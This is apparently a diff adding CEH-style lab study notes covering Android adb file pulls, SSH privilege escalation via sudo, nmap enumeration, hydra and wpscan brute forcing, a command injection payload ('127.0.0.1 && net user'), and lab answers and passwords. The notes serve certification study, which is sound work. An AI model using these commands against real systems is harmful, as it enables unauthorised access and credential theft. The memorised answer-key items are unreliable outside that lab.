@@ -243,6 +243,461 @@ Hacking Wireless Networks
 		aircrack-ng -a2 -b <target BSSID> -w <password list.txt> <WP2 PCAP file>
 		
 	
+An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. Yiu are assigned to 
+covertly access the users device to obtain
+
+		Malicious elf files stored in a folder "scan"
+		Perform deel scan on the elf files to obtain de last 4 digits of the SHA384 hash file of the file with the highest
+		entropy value
+		
+		We already connect with adb to the target - in port 5555
+		
+			adb connect 192.168.56.12:5555
+			adb shell
+			cd sdcard
+			cd scan
+				ls
+				file1.elf
+				file3.elf
+				file3.elf
+				
+			first we need to move this folder to our machine
+				we copy the path were the files are /sdcard/scan
+			
+			adb pull /sdcard/scan dd/			dd/ is get root permissions
+			
+			a scan folder id created in our machine with the .elf files
+			
+			cd scan
+				ls
+				file1.elf
+				file3.elf
+				file3.elf
+	
+		Now we need to calculate de entropy and see which of the files has the highest entropy value
+				ent file1.txt			
+		 	ent file2.txt
+			
+			ent file3.txt
+			
+		With this tool we get different Entropy values
+
+		Now that we have the file with the hig entropy (lets say is file1.txt),
+			sha384sum file1.txt
+			
+			it generates a hash:
+			fsdflklkjlksljkjflksdfljlskdjflksdjflskdklkfjslkdjfslkdfdffdfddfe344543ef
+			
+		so to answer the question, the last four digits are: 43ef
+		
+		
+Priviledge Escalation
+Example:
+
+Q1 - You used shoulder surfing to identify the username and password of a user on the Ubuntu machine in the 192.168.0.0/24 network that is kali and pass@123. Access the target machine , 
+perform vertical escalation to that of a root user and enter the content of the imroot.txt file as the answer.
+
+	nmap -sV -p 22 192.168.0.0/24
+	
+	after we identify the ip with port 22 open and running linux, we enter with
+	
+		ssh kali@192.168.0.1
+		
+		use the given password pass@123
+		
+			Now that we are in lets see what we can do if we were sudo
+			
+			sudo -l
+			
+			Lets try to get root
+			
+			sudo -i
+			
+			If it is accepted by the system
+			
+			whoami
+			
+			root
+			
+			Great, let find the file...
+			
+				find . -name imroot.txt
+
+CVE and CVSS
+
+Q - Perform a vulnerability scan for the host with ip address 192.168.56.21. What is the severity score of a vulnerability tha indicates
+ the EOL od a web development language platform?
+ 
+	nmap -Pn --script vuln 192.168.56.21
+	
+	In the found CVE's look for one that mentions EOL, out of date... If not copy the CVE and look on google.
+	
+	Then in the NVD database look for the CVSS.
 	
 	
-	
+SUMMARY
+
+Enumeration & Reconnaissance
+
+Identify live machines on a subnet:
+
+nmap -sn 192.168.0.0/24
+
+
+
+Detect open ports:
+
+nmap -p- 192.168.0.X
+
+
+
+Find Domain Controller:
+
+nmap -p 389, 636, 88, 3268 192.168.0.0/24
+
+
+
+Get NetBIOS and FQDN:
+
+nmap -sC 192.168.0.X --top-ports=20
+
+
+
+Find OpenSSH version:
+
+nmap -p 22 192.168.0.0/24 --open -T5 -sV
+
+
+
+Detect OS:
+
+Step 1: nmap -p 3306 192.168.0.X --open
+
+Step 2: nmap -O 192.168.0.X -sV -T5
+
+
+
+LDAP Enumeration (user count):
+
+nmap 192.168.0.X --script=*user*
+
+
+
+Get LDAP version:
+
+ldapsearch -x -H ldap://192.168.0.X
+
+
+
+Service Discovery
+
+Check if NFS is enabled:
+
+nmap -p 111 192.168.0.0/24 --open
+
+
+
+DNS enumeration:
+
+nslookup -type=ns www.certifiedhacker.com
+
+
+
+Find SMTP service machine:
+
+nmap -p 25 192.168.0.0/24 --open -T5
+
+
+
+SMB enumeration (check message signing):
+
+nmap -p 445 192.168.0.X -sC -T5
+
+
+
+Password Attacks
+
+Crack NT hashes:
+
+john hashes.txt --format=NT --wordlist=password.txt
+
+
+
+Brute-force FTP:
+
+hydra -L Username.txt -P Passwords.txt 172.16.0.12 ftp 
+
+ftp 172.16.0.12 
+
+ftp> ls 
+
+ftp> mget * 
+
+cat flag.txt
+
+Use LophtCrack for password audit (GUI)
+
+
+
+File & Hash Extraction
+
+Upload and read file from DVWA:
+
+Access via: http://10.10.10.25:8080/DVWA
+
+Then use:
+
+type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+
+
+
+Decrypt hash using:
+
+
+https://hashes.com/en/decrypt/hash
+
+
+https://crackstation.net
+
+
+
+Steganography & Hidden Data
+
+Extract hidden text using Snow:
+
+snow.exe -C "C:\path\to\file.txt"
+
+
+
+Use OpenStego to extract from image
+
+
+
+Analyze .exe using BinText
+
+
+
+Analyze ELF binary:
+
+file Sample-ELF or use Ghidra
+
+
+
+Wireshark Challenges
+
+Filter HTTP POST leakage:
+
+http.request.method == POST
+
+
+
+Find data in UDP:
+
+Use filter udp, then inspect the payload
+
+
+
+Find ICMP ID:
+
+Use filter icmp
+
+
+
+Identify DoS source IP:
+
+Use: Statistics → Conversations
+
+
+
+Count attacking machines (DDoS):
+
+Look at Conversations tab (IPv4 tab)
+
+
+
+Detect session hijack protocol:
+
+Filter arp
+
+
+
+Check length of UDP data:
+
+Use filter udp
+
+
+
+Web & CMS Enumeration
+
+Find nginx version:
+
+whatweb www.example.com
+
+
+
+Check CMS used:
+
+whatweb / wig / wapalyzer
+
+
+
+Crawl for PNG files:
+
+curl http://example.com/ | grep .png | wc -l
+
+
+
+Find load balancer:
+
+lbd example.com or whatweb
+
+
+
+Parameter tampering:
+
+Try changing profile ID:
+
+movies.cehorg.com/viewprofile.aspx?id=1003
+
+→ Answer: linda
+
+
+
+Bruteforce WordPress login:
+
+wpscan --url http://cehorg.com/ -U adam -P /path/password.txt
+
+→ Found password: Orange1234
+
+
+
+Command Injection
+
+Command injection via web form:
+
+127.0.0.1 && net user
+
+→ Get user count (e.g., 8 users)
+
+
+
+Mobile Exploitation
+
+Use Phonesploit to capture screenshot:
+
+phonesploit.py 
+
+Connect to 172.16.0.21 
+
+Select option to pull screenshot: 
+
+sdcard/DCIM/capture.png
+
+
+
+Read files from mobile:
+
+adb shell 
+
+su root 
+
+cd sdcard/Download 
+
+cat confidential.txt 
+
+Audit APK (AntiMalwarescanner.apk) for permissions:
+
+Use: https://sisik.eu/apk-tool
+
+
+
+IoT & MQTT Analysis
+
+Analyze MQTT traffic:
+
+Wireshark → Filter mqtt
+
+Check line 49 or 201
+
+Topics: Fleet_Count, Data Bre@ch @lert
+
+
+
+Encryption Challenges
+
+Decrypt .aes file:
+
+Use AES Tool, password: qwerty
+
+
+
+Mount VeraCrypt volume:
+
+Password: test → Count files (e.g., 6)
+
+
+
+Decrypt hidden IP:
+
+Use BCTextEncoder → password: Pa$$w0rd
+
+→ Example output: 10.10.10.31
+
+
+
+Decrypt ransomware file (cryt-128–06encr.hex) using CrypTool:
+
+Algorithm: Twofish
+
+Hidden text: @!ph@|tE*t
+
+
+
+Footprinting
+
+Use https://www.ipvoid.com/ip-geolocation/
+
+→ Get latitude/longitude for IP
+
+
+
+Use https://shodan.io
+
+→ Check if IP relates to SCADA/ICS/IoT systems in the US
+
+
+
+Additional Useful Commands
+
+Windows service type check:
+
+(Get-Service -Name “afunix”).ServiceType
+
+
+
+DHCP Starvation (tcpdump):
+
+sudo tcpdump -i eth0 -v
+
+
+
+HTTP recon using telnet:
+
+telnet example.com 80 
+
+GET / HTTP/1.0
+			
+				
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
